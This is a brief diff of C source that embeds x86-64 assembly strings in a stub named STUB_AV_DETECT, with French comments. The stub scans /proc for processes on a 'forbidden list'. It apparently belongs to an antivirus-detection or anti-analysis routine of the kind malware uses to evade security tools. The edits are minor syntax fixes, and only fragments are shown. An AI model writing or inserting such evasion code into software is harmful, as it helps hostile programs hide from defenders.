@@ -5,7 +5,6 @@ static const char STUB_AV_DETECT[] =
 //"section .text\n"
 //    "global _start\n"
 "scan_start:\n"//remove
-"scan_end:\n"//remove
 "_start:\n"
     //; Ouvrir le répertoire /proc
     "mov rax, 2\n"          //; sys_open
@@ -173,8 +172,9 @@ static const char STUB_AV_DETECT[] =
     "inc rax\n"
     "jmp strlen_loop\n"
 "strlen_done:\n"
-    "ret"
+    "ret";
 
+static const char STUB_AV_DATA[] =
 //"section .data\n"
     //; Liste des processus interdits (terminés par un NULL)
     "forbidden_list:\n"
